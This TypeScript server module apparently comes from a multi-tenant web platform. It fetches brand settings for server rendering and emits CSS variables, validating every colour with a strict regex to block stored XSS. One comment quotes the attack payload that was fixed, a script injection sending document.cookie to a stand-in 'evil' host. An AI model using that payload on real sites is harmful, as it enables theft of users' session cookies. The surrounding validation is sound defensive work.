import "server-only";
import { PlatformSettingsDB } from "@/lib/db/platform-settings.db";
import {
  PLATFORM_CONFIG_DEFAULTS,
  PLATFORM_CONFIG_KEYS,
  flatToNested,
  type PlatformConfig,
} from "@/lib/platform-config";

/**
 * lib/platform-config.server.ts — fetch del PlatformConfig en server
 * components (root layout, páginas SSR). Reusa el cache de
 * PlatformSettingsDB.getAll() (5 min) — no agregamos otro layer.
 *
 * Brandon mayo 2026: el root layout llama esta función para inyectar
 * los colores y el nombre de marca antes del primer paint, evitando
 * el flash de "verde Buleje default" cuando el cliente cambió a su
 * propia paleta.
 */
export async function getPlatformConfigSSR(): Promise<PlatformConfig> {
  try {
    const all = await PlatformSettingsDB.getAll();
    const flat: Record<string, unknown> = {};
    for (const k of Object.keys(PLATFORM_CONFIG_KEYS)) {
      if (k in all) flat[k] = all[k];
    }
    return flatToNested(flat);
  } catch {
    // Si la DB no responde, defaults — el sitio sigue funcionando con la
    // identidad por defecto de Buleje. Mejor degradar que romper.
    return PLATFORM_CONFIG_DEFAULTS;
  }
}

/**
 * Round 22 P1 (Security Pentester): pre-validador estricto de color CSS.
 * Antes el `cfg.brand.primaryColor` se interpolaba directo dentro de un
 * `<style dangerouslySetInnerHTML>` global → un superadmin malicioso podía
 * inyectar `red;}</style><script>fetch('//evil/'+document.cookie)</script>`
 * y comprometer TODOS los tenants en cada request.
 *
 * Acepta solo formatos seguros:
 *   - hex 3/4/6/8 dígitos: #abc, #abcd, #aabbcc, #aabbcc88
 *   - rgb()/rgba() con números enteros + alpha decimal opcional
 *   - hsl()/hsla() con grados + %
 * Rechaza cualquier cosa con `;`, `}`, `<`, `>`, comillas o llaves.
 */
const COLOR_RE = /^(?:#[0-9a-fA-F]{3,8}|rgba?\(\s*\d+\s*,\s*\d+\s*,\s*\d+(?:\s*,\s*[\d.]+)?\s*\)|hsla?\(\s*\d+\s*,\s*\d+%?\s*,\s*\d+%?(?:\s*,\s*[\d.]+)?\s*\))$/;

function safeColor(value: string | null | undefined): string | null {
  if (typeof value !== "string") return null;
  const trimmed = value.trim();
  if (!COLOR_RE.test(trimmed)) return null;
  return trimmed;
}

/**
 * Devuelve un bloque CSS `:root` con los CSS vars de marca aplicados.
 * Inyectar en `<head>` o al inicio de `<body>` para evitar FOUC.
 *
 * Sólo emite vars cuyos valores difieran del default — así no
 * sobreescribimos los tokens del DS si el cliente todavía no
 * configuró nada. Round 22: cada valor pasa por safeColor() antes
 * de interpolarse — rechaza payloads de stored XSS.
 */
export function brandColorOverridesCss(cfg: PlatformConfig): string | null {
  const overrides: string[] = [];
  const primary = safeColor(cfg.brand.primaryColor);
  if (primary && primary !== PLATFORM_CONFIG_DEFAULTS.brand.primaryColor) {
    overrides.push(`--brand-primary: ${primary};`);
    overrides.push(`--accent: ${primary};`);
    /*
     * La marca elegida tiene que arrastrar TODA su escala, no sólo el tono base.
     *
     * El acento del DS no es un color: son seis tokens —`--accent` y sus
     * derivados— y media UI usa los derivados, no la base. El CTA del login,
     * por ejemplo, es `bg-[var(--accent-600)]`. Pisando sólo `--accent`, un
     * negocio que elige su color quedaba con la página partida: el tono nuevo
     * en los textos y los KPIs, y el turquesa del DS en los botones, los hovers
     * y los tintes. Dos identidades en la misma pantalla.
     *
     * Los porcentajes se calibraron contra la escala real de `globals.css`:
     * partiendo del turquesa #00A0A0, 88 % reproduce #008787, 79 % da #007575
     * y 75 % da #006B6B — Δ de 0 a 2 por canal. Misma técnica que
     * `design-presets` usa para
     * derivar los colores semánticos: `color-mix` en oklab, que mantiene la
     * luminosidad percibida en cualquier hue — un derivado calculado en RGB se
     * ensucia con los colores cálidos.
     */
    overrides.push(`--accent-600: color-mix(in oklab, ${primary} 88%, black);`);
    overrides.push(`--accent-dark: color-mix(in oklab, ${primary} 79%, black);`);
    overrides.push(`--accent-ink: color-mix(in oklab, ${primary} 75%, black);`);
    overrides.push(`--accent-soft: color-mix(in oklab, ${primary} 6%, transparent);`);
    overrides.push(`--accent-muted: color-mix(in oklab, ${primary} 13%, transparent);`);
  }
  const secondary = safeColor(cfg.brand.secondaryColor);
  if (secondary && secondary !== PLATFORM_CONFIG_DEFAULTS.brand.secondaryColor) {
    overrides.push(`--brand-secondary: ${secondary};`);
  }
  if (overrides.length === 0) return null;
  return `:root{${overrides.join("")}}`;
}
